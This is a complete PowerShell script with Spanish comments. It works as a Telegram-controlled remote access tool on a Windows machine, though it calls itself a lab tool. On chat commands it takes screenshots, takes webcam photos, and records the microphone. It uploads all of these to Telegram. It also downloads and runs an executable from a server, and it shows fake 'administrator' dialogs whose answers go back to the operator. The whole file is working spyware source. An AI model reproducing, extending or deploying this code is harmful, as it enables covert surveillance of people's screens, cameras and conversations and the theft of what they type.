# ==========================================
# CONFIGURACION DE TELEGRAM Y RED
# ==========================================
$Token   = ""
$ChatID  = ""
$ServidorWeb = "http://192.168.1.44:5000"  # Servidor de laboratorio donde aloja CommandCam.exe y fondo.png

# Inicializar variables de control para los mensajes
$URL_Base = "https://api.telegram.org/bot$Token"
$UltimoUpdateID = 0

Write-Host "[*] Iniciando servidor hibrido interactivo definitivo..." -ForegroundColor Cyan
Write-Host "[*] Comandos: /cap, /cam, /tts <msg>, /mic <seg>, /notify <msg>, /chat <msg>, /wallpaper" -ForegroundColor Yellow
Write-Host "[*] Presiona Ctrl + C en esta consola para apagar el bot." -ForegroundColor Gray

# Definicion de la firma de C# para el microfono (Aislada y funcional)
$MciScript = @"
using System;
using System.Runtime.InteropServices;

namespace Win32
{
    public class MciAPI
    {
        [DllImport("winmm.dll")]
        public static extern long mciSendString(string command, System.Text.StringBuilder returnString, int returnLength, IntPtr callback);
    }
}
"@
Add-Type -TypeDefinition $MciScript

# ==========================================
# BUCLE PRINCIPAL DE ESCUCHA (LONG POLLING)
# ==========================================
while ($true) {
    try {
        # Consultar si hay nuevos mensajes (espera hasta 20 segundos por un mensaje)
        $URL_Updates = "$URL_Base/getUpdates?offset=$UltimoUpdateID&timeout=20"
        $Updates = Invoke-RestMethod -Uri $URL_Updates -Method Get -TimeoutSec 30

        foreach ($Update in $Updates.result) {
            # Actualizar el ID para no volver a procesar el mismo mensaje
            $UltimoUpdateID = $Update.update_id + 1

            # Extraer el texto y el ID del emisor
            $MensajeTexto = $Update.message.text
            $UsuarioID    = $Update.message.chat.id

            # MEDIDA DE SEGURIDAD CRITICA: Filtrar por tu ChatID personal
            if ($UsuarioID -eq $ChatID) {
                
                # Por defecto, ninguna accion requiere envio de archivos binarios al final
                $ProcesarEnvio = $false
                $rutaArchivo = ""
                $MimeType = ""
                $TextoCaption = ""
                
                # --------------------------------------------------
                # ACCION 1: CAPTURA DE PANTALLA (/cap)
                # --------------------------------------------------
                if ($MensajeTexto -eq "/cap") {
                    Write-Host "[!] Comando /cap recibido a las $(Get-Date -Format 'HH:mm:ss'). Tomando captura de pantalla..." -ForegroundColor Green
                    
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-Type -AssemblyName System.Drawing
                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen
                    $bounds = $screen.Bounds
                    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
                    
                    $rutaArchivo = "$env:TEMP\captura_remota.png"
                    if (Test-Path $rutaArchivo) { Remove-Item $rutaArchivo -Force }
                    
                    $bitmap.Save($rutaArchivo, [System.Drawing.Imaging.ImageFormat]::Png)
                    $graphics.Dispose()
                    $bitmap.Dispose()

                    $MimeType = "image/png"
                    $TextoCaption = "Monitoreo Remoto - Pantalla a las: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
                    $ProcesarEnvio = $true
                }
                
                # --------------------------------------------------
                # ACCION 2: CAPTURA DE WEBCAM (/cam)
                # --------------------------------------------------
                elseif ($MensajeTexto -eq "/cam") {
                    Write-Host "[!] Comando /cam recibido a las $(Get-Date -Format 'HH:mm:ss'). Validando recursos..." -ForegroundColor Green
                    
                    $rutaExe     = "$env:TEMP\CommandCam.exe"
                    $rutaArchivo = "$env:TEMP\foto_webcam.jpg"
                    if (Test-Path $rutaArchivo) { Remove-Item $rutaArchivo -Force }

                    # Verificacion y descarga bajo demanda del binario de la camara
                    if (-not (Test-Path $rutaExe)) {
                        Write-Host "[*] CommandCam.exe no detectado en Temp. Descargando desde el servidor..." -ForegroundColor Yellow
                        try {
                            $WebClient = New-Object System.Net.WebClient
                            $WebClient.DownloadFile("$ServidorWeb/CommandCam.exe", $rutaExe)
                        } catch {
                            Write-Host "[-] Error critico: No se pudo descargar el componente de video." -ForegroundColor Red
                        }
                    }

                    # Ejecucion capturando la salida de texto
                    if (Test-Path $rutaExe) {
                        Write-Host "[*] Inicializando captura con dispositivo de video..." -ForegroundColor Cyan
                        $SalidaConsola = & $rutaExe /filename "$rutaArchivo" 2>&1
                    }

                    if (Test-Path $rutaArchivo) {
                        $MimeType = "image/jpeg"
                        $TextoCaption = "Monitoreo Remoto - Webcam a las: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
                        $ProcesarEnvio = $true
                    } else {
                        $ProcesarEnvio = $false
                        if ($SalidaConsola -match "Could not run filter graph" -or $SalidaConsola -match "2147943850") {
                            $TextoAlerta = "[Error de Hardware] La camara 'DV20 USB CAMERA' se encuentra bloqueada o sin recursos."
                        } else {
                            $TextoAlerta = "[Error General] No se pudo generar la captura. Dispositivo desconectado."
                        }
                        Write-Host "[-] $TextoAlerta" -ForegroundColor Red
                        $null = Invoke-RestMethod -Uri "$URL_Base/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAlerta }
                    }
                }

                # --------------------------------------------------
                # ACCION 3: SINTESIS DE VOZ (/tts <mensaje>)
                # --------------------------------------------------
                elseif ($MensajeTexto -like "/tts *") {
                    $TextoAVoz = $MensajeTexto.Substring(5).Trim()
                    if (-not [string]::IsNullOrEmpty($TextoAVoz)) {
                        Write-Host "[!] Comando /tts recibido a las $(Get-Date -Format 'HH:mm:ss'). Reproduciendo: '$TextoAVoz'" -ForegroundColor Green
                        try {
                            $Sapi = New-Object -ComObject SAPI.SpVoice
                            $null = $Sapi.Speak($TextoAVoz, 1)
                            $null = Invoke-RestMethod -Uri "$URL_Base/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "[Audio] Reproduciendo por los parlantes: `"$TextoAVoz`"" }
                        } catch {
                            Write-Host "[-] Error al invocar la API de voz: $_" -ForegroundColor Red
                        }
                    }
                }

                # --------------------------------------------------
                # ACCION 4: CAPTURA DE AUDIO COMPLETAMENTE AISLADA (/mic <segundos>)
                # --------------------------------------------------
                elseif ($MensajeTexto -like "/mic *") {
                    if ($MensajeTexto -match "\d+") { $Segundos = [int]$Matches[0] } else { $Segundos = 5 }
                    if ($Segundos -lt 1) { $Segundos = 1 }
                    if ($Segundos -gt 60) { $Segundos = 60 }

                    Write-Host "[!] Comando /mic recibido a las $(Get-Date -Format 'HH:mm:ss'). Grabando por $Segundos segundos..." -ForegroundColor Green
                    $rutaAudio = "$env:TEMP\grabacion_mic.wav"
                    if (Test-Path $rutaAudio) { Remove-Item $rutaAudio -Force }

                    try {
                        [Win32.MciAPI]::mciSendString("open new type waveaudio alias grabador", $null, 0, [IntPtr]::Zero) | Out-Null
                        [Win32.MciAPI]::mciSendString("set grabador bitspersample 16 samplespersec 44100 channels 2 bytespersec 176400 alignment 4", $null, 0, [IntPtr]::Zero) | Out-Null
                        [Win32.MciAPI]::mciSendString("record grabador", $null, 0, [IntPtr]::Zero) | Out-Null
                        
                        Start-Sleep -Seconds $Segundos
                        
                        [Win32.MciAPI]::mciSendString("stop grabador", $null, 0, [IntPtr]::Zero) | Out-Null
                        [Win32.MciAPI]::mciSendString("save grabador `"$rutaAudio`"", $null, 0, [IntPtr]::Zero) | Out-Null
                        [Win32.MciAPI]::mciSendString("close grabador", $null, 0, [IntPtr]::Zero) | Out-Null

                        if (Test-Path $rutaAudio) {
                            Write-Host "[*] Preparando transferencia multipart de audio hacia Telegram..." -ForegroundColor Gray
                            $Boundary = [System.Guid]::NewGuid().ToString()
                            $LF = "`r`n"
                            
                            $FileBytes = [System.IO.File]::ReadAllBytes($rutaAudio)
                            $FileName = [System.IO.Path]::GetFileName($rutaAudio)
                            $CaptionAudio = "Monitoreo de Audio - Duracion: $Segundos s - Captura a las: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"

                            $BodyText = "--$Boundary$LF"
                            $BodyText += "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$ChatID$LF"
                            $BodyText += "--$Boundary$LF"
                            $BodyText += "Content-Disposition: form-data; name=`"caption`"$LF$LF$CaptionAudio$LF"
                            $BodyText += "--$Boundary$LF"
                            $BodyText += "Content-Disposition: form-data; name=`"voice`"; filename=`"$FileName`"$LF"
                            $BodyText += "Content-Type: audio/wav$LF$LF"

                            $Encoding = [System.Text.Encoding]::GetEncoding("UTF-8")
                            $HeaderBytes = $Encoding.GetBytes($BodyText)
                            $FooterBytes = $Encoding.GetBytes("$LF--$Boundary--$LF")

                            $TotalBytes = New-Object Byte[] ($HeaderBytes.Length + $FileBytes.Length + $FooterBytes.Length)
                            [System.Buffer]::BlockCopy($HeaderBytes, 0, $TotalBytes, 0, $HeaderBytes.Length)
                            [System.Buffer]::BlockCopy($FileBytes, 0, $TotalBytes, $HeaderBytes.Length, $FileBytes.Length)
                            [System.Buffer]::BlockCopy($FooterBytes, 0, $TotalBytes, ($HeaderBytes.Length + $FileBytes.Length), $FooterBytes.Length)

                            $ContentType = "multipart/form-data; boundary=$Boundary"
                            $null = Invoke-RestMethod -Uri "$URL_Base/sendVoice" -Method Post -ContentType $ContentType -Body $TotalBytes
                            
                            Remove-Item $rutaAudio -Force
                            Write-Host "[+] Nota de voz transmitida exitosamente." -ForegroundColor Green
                        }
                    } catch {
                        Write-Host "[-] Error en subsistema de audio: $_" -ForegroundColor Red
                    }
                }

                # --------------------------------------------------
                # ACCION 5: ALERTA VISUAL TOAST EN PANTALLA (/notify <mensaje>)
                # --------------------------------------------------
                elseif ($MensajeTexto -like "/notify *") {
                    $TextoNotificacion = $MensajeTexto.Substring(8).Trim()
                    if (-not [string]::IsNullOrEmpty($TextoNotificacion)) {
                        Write-Host "[!] Comando /notify recibido a las $(Get-Date -Format 'HH:mm:ss'). Desplegando alerta..." -ForegroundColor Green
                        try {
                            [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType=WindowsRuntime] | Out-Null
                            $XmlTemplate = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
                            
                            $XmlTextos = $XmlTemplate.GetElementsByTagName("text")
                            $NodoTitulo = $XmlTemplate.CreateTextNode("Alerta de Laboratorio")
                            $NodoCuerpo = $XmlTemplate.CreateTextNode($TextoNotificacion)
                            
                            $null = $XmlTextos.Item(0).AppendChild($NodoTitulo)
                            $null = $XmlTextos.Item(1).AppendChild($NodoCuerpo)
                            
                            $Toast = [Windows.UI.Notifications.ToastNotification]::new($XmlTemplate)
                            $AppId = "windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel"
                            [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AppId).Show($Toast)
                            
                            $null = Invoke-RestMethod -Uri "$URL_Base/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "[Notificacion] Alerta en pantalla: `"$TextoNotificacion`"" }
                        } catch {
                            Write-Host "[-] Error al desplegar la notificacion visual: $_" -ForegroundColor Red
                        }
                    }
                }

                # --------------------------------------------------
                # ACCION 6: CHAT INTERACTIVO COMPILADO DIRECTO (Sin hilos sospechosos)
                # --------------------------------------------------
                elseif ($MensajeTexto -like "/chat *") {
                    $MensajeParaUsuario = $MensajeTexto.Substring(6).Trim()
                    
                    if (-not [string]::IsNullOrEmpty($MensajeParaUsuario)) {
                        Write-Host "[!] Comando /chat recibido a las $(Get-Date -Format 'HH:mm:ss'). Lanzando ventana grafica..." -ForegroundColor Green
                        
                        try {
                            Add-Type -AssemblyName System.Windows.Forms
                            Add-Type -AssemblyName System.Drawing
                            
                            $Form = New-Object System.Windows.Forms.Form
                            $Form.Text = "Mensaje del Administrador"
                            $Form.Size = New-Object System.Drawing.Size(400, 200)
                            $Form.StartPosition = "CenterScreen"
                            $Form.FormBorderStyle = "FixedDialog"
                            $Form.MaximizeBox = $false
                            $Form.MinimizeBox = $false
                            $Form.TopMost = $true 
                            
                            $Label = New-Object System.Windows.Forms.Label
                            $Label.Text = $MensajeParaUsuario
                            $Label.Location = New-Object System.Drawing.Point(20, 20)
                            $Label.Size = New-Object System.Drawing.Size(340, 40)
                            $Label.Font = New-Object System.Drawing.Font("Arial", 10, [System.Drawing.FontStyle]::Bold)
                            $Form.Controls.Add($Label)
                            
                            $TextBox = New-Object System.Windows.Forms.TextBox
                            $TextBox.Location = New-Object System.Drawing.Point(20, 70)
                            $TextBox.Size = New-Object System.Drawing.Size(340, 25)
                            $Form.Controls.Add($TextBox)
                            
                            $Button = New-Object System.Windows.Forms.Button
                            $Button.Text = "Enviar Respuesta"
                            $Button.Location = New-Object System.Drawing.Point(130, 110)
                            $Button.Size = New-Object System.Drawing.Size(120, 30)
                            
                            $Button.Add_Click({
                                $RespuestaText = $TextBox.Text.Trim()
                                if (-not [string]::IsNullOrEmpty($RespuestaText)) {
                                    $TextoFinal = "[Respuesta desde Computadora]: $RespuestaText"
                                    try {
                                        $null = Invoke-RestMethod -Uri "$URL_Base/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoFinal }
                                    } catch {}
                                }
                                $Form.Close()
                            })
                            
                            $Form.Controls.Add($Button)
                            $null = $Form.ShowDialog()
                            Write-Host "[+] Ventana cerrada. Continuando escucha en el bucle principal..." -ForegroundColor Gray
                        } catch {
                            Write-Host "[-] Error en el contenedor grafico: $_" -ForegroundColor Red
                        }
                    }
                }

                # --------------------------------------------------
                # ACCION 7: CAMBIAR FONDO DESDE SERVIDOR LOCAL (/wallpaper)
                # --------------------------------------------------
                elseif ($MensajeTexto -eq "/wallpaper") {
                    Write-Host "[!] Comando /wallpaper recibido a las $((Get-Date).ToString('HH:mm:ss')). Solicitando fondo.png al servidor..." -ForegroundColor Cyan
                    try {
                        # Forzamos extension .jpg local para evitar que user32.dll deje la pantalla en negro
                        $RutaWallpaper = "$env:TEMP\fondo_laboratorio.jpg"
                        
                        if (Test-Path $RutaWallpaper) { Remove-Item $RutaWallpaper -Force }
                        
                        # Apuntamos a fondo.png en tu servidor web local
                        $UrlImagenLocal = "$ServidorWeb/fondo.png"
                        
                        $WebClient = New-Object System.Net.WebClient
                        $WebClient.DownloadFile($UrlImagenLocal, $RutaWallpaper)
                        
                        if (Test-Path $RutaWallpaper) {
                            $CodigoWallpaper = @"
                            using System.Runtime.InteropServices;
                            public class Wallpaper {
                                [DllImport("user32.dll", CharSet = CharSet.Auto)]
                                public static extern int SystemParametersInfo(int uAction, int uParam, string lvParam, int fuWinIni);
                            }
"@
                            Add-Type -TypeDefinition $CodigoWallpaper -ErrorAction SilentlyContinue
                            
                            # Cambiar fondo (20 = SPI_SETDESKWALLPAPER, 3 = Forzar refresco)
                            [Wallpaper]::SystemParametersInfo(20, 0, $RutaWallpaper, 3) | Out-Null
                            
                            Write-Host "[+] Fondo de pantalla actualizado con la imagen del servidor." -ForegroundColor Green
                            $null = Invoke-RestMethod -Uri "$URL_Base/sendMessage" -Method Post -Body @{ 
                                chat_id = $ChatID; 
                                text = "[Escritorio] Fondo cambiado con exito usando 'fondo.png'." 
                            }
                        }
                    } catch {
                        Write-Host "[-] Error al obtener fondo.png desde el servidor: $_" -ForegroundColor Red
                        $null = Invoke-RestMethod -Uri "$URL_Base/sendMessage" -Method Post -Body @{ 
                            chat_id = $ChatID; 
                            text = "[Error] No se pudo procesar la imagen del servidor web." 
                        }
                    }
                }

                # --------------------------------------------------
                # PROCESAMIENTO GENERAL DE ENVIO POR MULTIPART (SOLO IMÁGENES /cap y /cam)
                # --------------------------------------------------
                if ($ProcesarEnvio -and (Test-Path $rutaArchivo)) {
                    Write-Host "[*] Preparando transferencia multipart hacia los servidores de Telegram..." -ForegroundColor Gray
                    
                    $URL_Send = "$URL_Base/sendPhoto"
                    $Boundary = [System.Guid]::NewGuid().ToString()
                    $LF = "`r`n"
                    
                    $FileBytes = [System.IO.File]::ReadAllBytes($rutaArchivo)
                    $FileName = [System.IO.Path]::GetFileName($rutaArchivo)

                    $BodyText = "--$Boundary$LF"
                    $BodyText += "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$ChatID$LF"
                    $BodyText += "--$Boundary$LF"
                    $BodyText += "Content-Disposition: form-data; name=`"caption`"$LF$LF$TextoCaption$LF"
                    $BodyText += "--$Boundary$LF"
                    $BodyText += "Content-Disposition: form-data; name=`"photo`"; filename=`"$FileName`"$LF"
                    $BodyText += "Content-Type: $MimeType$LF$LF"

                    $Encoding = [System.Text.Encoding]::GetEncoding("UTF-8")
                    $HeaderBytes = $Encoding.GetBytes($BodyText)
                    $FooterBytes = $Encoding.GetBytes("$LF--$Boundary--$LF")

                    $TotalBytes = New-Object Byte[] ($HeaderBytes.Length + $FileBytes.Length + $FooterBytes.Length)
                    [System.Buffer]::BlockCopy($HeaderBytes, 0, $TotalBytes, 0, $HeaderBytes.Length)
                    [System.Buffer]::BlockCopy($FileBytes, 0, $TotalBytes, $HeaderBytes.Length, $FileBytes.Length)
                    [System.Buffer]::BlockCopy($FooterBytes, 0, $TotalBytes, ($HeaderBytes.Length + $FileBytes.Length), $FooterBytes.Length)

                    $ContentType = "multipart/form-data; boundary=$Boundary"
                    $null = Invoke-RestMethod -Uri $URL_Send -Method Post -ContentType $ContentType -Body $TotalBytes

                    if (Test-Path $rutaArchivo) { Remove-Item $rutaArchivo -Force }
                    Write-Host "[+] Archivo de monitoreo transmitido con exito." -ForegroundColor Green
                }
            } else {
                if ($null -ne $UsuarioID) {
                    Write-Host "[!] Intento de acceso no autorizado del ID: $UsuarioID" -ForegroundColor Red
                }
            }
        }
    } catch {
        Write-Warning "Error de conexion o timeout en la API de Telegram. Reintentando en 5s... ($_)"
        Start-Sleep -Seconds 5
    }
}